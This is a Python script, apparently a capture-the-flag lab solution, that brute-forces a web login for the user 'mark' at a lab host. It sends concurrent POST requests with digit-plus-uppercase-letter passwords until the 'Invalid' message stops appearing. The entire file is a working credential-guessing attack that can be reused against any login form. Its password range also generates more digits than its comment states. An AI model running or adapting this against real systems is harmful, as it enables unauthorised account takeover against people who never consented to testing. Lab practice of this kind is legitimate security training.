#!/usr/bin/env python3
import requests
import string
import asyncio
import aiohttp

url = "http://python.thm/labs/lab1/index.php"
username = "mark"

# Generates passwords with 3 digits and 1 uppercase letter
letters = string.ascii_uppercase
async def try_password(session, password, semaphore):
    async with semaphore:
        data = {"username": username, "password": password}
        try:
            async with session.post(url, data=data, timeout=10) as response:
                text = await response.text()
                if "Invalid" not in text:
                    print(f"[+] Found valid credentials: {username}:{password}")
                    return password
                else:
                    print(f"[-] Attempted: {password}")
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"[!] Error with {password}: {str(e)}")
    return None

async def brute_force():
    # Limit requests ----------->
    semaphore = asyncio.Semaphore(50)
    
    batch_size = 1000
    
    async with aiohttp.ClientSession() as session:
        for letter in letters:
            for batch_start in range(0, 10000, batch_size):
                batch_end = min(batch_start + batch_size, 10000)
                batch = [str(i).zfill(3) + letter for i in range(batch_start, batch_end)]
                
                tasks = []
                for password in batch:
                    task = asyncio.create_task(try_password(session, password, semaphore))
                    tasks.append(task)
                
                for completed_task in asyncio.as_completed(tasks):
                    result = await completed_task
                    if result:
                        
                        for task in tasks:
                            if not task.done():
                                task.cancel()
                        return  

asyncio.run(brute_force())
